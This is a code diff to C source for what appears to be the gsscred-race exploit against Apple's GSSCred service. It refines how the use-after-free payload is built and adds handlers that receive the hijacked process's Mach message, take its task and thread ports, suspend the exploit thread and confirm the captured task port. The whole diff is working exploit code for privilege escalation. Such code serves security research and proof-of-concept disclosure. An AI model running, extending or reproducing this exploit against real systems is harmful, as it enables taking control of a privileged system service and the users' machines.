@@ -2,6 +2,7 @@
 
 #include "log.h"
 
+#include <assert.h>
 #include <objc/objc.h>
 #include <string.h>
 #include <sys/types.h>
@@ -36,8 +37,8 @@ static const size_t OFFSET__bucket_t__imp        = 8;
 
 // ---- Constants for platform-specific payload generation ----------------------------------------
 
-const size_t GSSCRED_RACE_PAYLOAD_OFFSET_PC   = PAYLOAD_OFFSET__bucket + OFFSET__bucket_t__imp;
-const size_t GSSCRED_RACE_PAYLOAD_OFFSET_ARG1 = PAYLOAD_OFFSET__name;
+const size_t PAYLOAD_OFFSET_PC   = PAYLOAD_OFFSET__bucket + OFFSET__bucket_t__imp;
+const size_t PAYLOAD_OFFSET_ARG1 = PAYLOAD_OFFSET__name;
 
 // ---- Payload generation ------------------------------------------------------------------------
 
@@ -100,10 +101,10 @@ generate_generic_payload(uint8_t *payload) {
 }
 
 bool
-gsscred_race_build_payload(char *uaf_string, uint8_t *payload) {
-	gsscred_race_platform_payload_generator_fn generate_platform_payload = NULL;
+gsscred_race_build_exploit_payload(char *uaf_string, uint8_t *payload) {
+	platform_payload_generator_fn generate_platform_payload = NULL;
 #if __arm64__
-	generate_platform_payload = arm64_choose_payload();
+	generate_platform_payload = arm64_choose_payload()->build_payload;
 #endif
 	generate_uaf_string(uaf_string);
 	generate_generic_payload(payload);
@@ -112,5 +113,46 @@ gsscred_race_build_payload(char *uaf_string, uint8_t *payload) {
 		return false;
 	}
 	generate_platform_payload(payload);
+	return true;
+}
+
+enum process_exploit_message_result
+gsscred_race_process_exploit_message(const mach_msg_header_t *exploit_message,
+		mach_port_t *task_port, mach_port_t *thread_port) {
+	// Skip messages that are not the exploit message.
+	if (exploit_message->msgh_id != EXPLOIT_MACH_MESSAGE_ID) {
+		DEBUG_TRACE(1, "Received unexpected message ID %x on listener "
+				"port", exploit_message->msgh_id);
+		return PROCESS_EXPLOIT_MESSAGE_RESULT_CONTINUE;
+	}
+	// All other messages get delegated to the message processing routine for the payload sent
+	// earlier.
+	payload_message_processor_fn process_exploit_message = NULL;
+#if __arm64__
+	process_exploit_message = arm64_choose_payload()->process_message;
+#endif
+	assert(process_exploit_message != NULL);
+	enum process_exploit_message_result result =
+		process_exploit_message(exploit_message, task_port, thread_port);
+	if (result == PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS) {
+		kern_return_t kr = thread_suspend(*thread_port);
+		if (kr != KERN_SUCCESS) {
+			WARNING("Could not suspend the exploit thread");
+		}
+	}
+	return result;
+}
+
+bool
+check_task_port(mach_port_t task_port) {
+	// Check that the task port we received in our exploit message is valid.
+	int pid = -1;
+	kern_return_t kr = pid_for_task(task_port, &pid);
+	if (kr != KERN_SUCCESS) {
+		WARNING("Message from exploit payload contains invalid "
+				"task port %x: %x", task_port, kr);
+		return false;
+	}
+	DEBUG_TRACE(1, "GSSCred's PID is %u", pid);
 	return true;
 }
